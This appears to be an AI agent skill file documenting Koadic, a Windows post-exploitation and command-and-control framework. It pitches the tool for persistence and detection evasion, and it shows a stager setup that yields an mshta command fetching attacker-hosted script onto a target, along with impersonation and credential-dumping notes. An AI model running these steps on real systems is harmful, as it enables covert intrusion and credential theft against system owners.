---
name: koadic
description: Windows post-exploitation rootkit and C2 framework using Windows Script Host (JScript/VBScript). Use for post-exploitation, lateral movement, and maintaining persistence on Windows systems ranging from Windows 2000 to Windows 11. It is particularly effective for evading detection by executing payloads in memory and using native Windows components.
---

# koadic

## Overview
Koadic (COM Command & Control) is a Windows post-exploitation framework similar to Meterpreter and PowerShell Empire. It performs operations primarily using Windows Script Host (JScript/VBScript), allowing for compatibility with nearly all default Windows installations. It supports in-memory payloads and cryptographically secure communications over SSL/TLS. Category: Post-Exploitation.

## Installation (if not already installed)
Assume koadic is already installed. If the command is missing:

```bash
sudo apt install koadic
```

## Common Workflows

### Starting the Interactive Console
```bash
koadic
```

### Running a Batch of Commands at Startup
```bash
koadic --autorun commands.txt
```

### Basic Stager Setup (Inside Koadic Shell)
Once inside the koadic interpreter, you typically set up a stager to get a "zombie" (session):
```text
(koadic: menu) > use stager/js/mshta
(koadic: stager/js/mshta) > set SRVHOST 192.168.1.10
(koadic: stager/js/mshta) > run
```
This will provide a command (e.g., `mshta http://192.168.1.10:9999/xyz`) to run on the target.

### Post-Exploitation Module Execution
After a zombie checks in:
```text
(koadic: menu) > use impersonate/process
(koadic: impersonate/process) > set ZOMBIE 0
(koadic: impersonate/process) > run
```

## Complete Command Reference

### Startup Options
```
usage: koadic [-h] [--autorun AUTORUN] [-o] [--restore RESTORE]
```

| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show the help message and exit. |
| `--autorun <file>` | Specify a file containing koadic commands to execute automatically upon startup. |
| `-o` | "It is tuesday my dudes" (Easter egg/Legacy flag). |
| `--restore <file>` | Path to a koadic restore JSON file to resume a previous session state. |

### Internal Console Commands
Once the koadic shell is active, the following commands are available:

| Command | Description |
|---------|-------------|
| `use <module>` | Load a specific stager or post-exploitation module. |
| `set <VAR> <VAL>` | Set a variable for the current module (e.g., SRVHOST, SRVPORT, ZOMBIE). |
| `show options` | Display the current configuration for the loaded module. |
| `run` | Execute the loaded module. |
| `zombies` | List all active compromised sessions. |
| `zombies <id>` | Interact with or view detailed information for a specific zombie. |
| `kill <id>` | Terminate a specific zombie session. |
| `exit` | Exit the koadic framework. |
| `help` | Show help for console commands. |

## Notes
- **Compatibility**: Supports Windows 2000, XP, Vista, 7, 8, 10, and 11.
- **Stealth**: Payloads are often executed via `mshta.exe`, `regsrv32.exe`, or `wmic.exe`, which are trusted Windows binaries.
- **Encryption**: Supports SSL/TLS for C2 traffic if the victim OS has the appropriate providers enabled.
- **Dependencies**: Relies on `impacket`, `pypykatz`, and `rjsmin` for various post-exploitation tasks like credential dumping.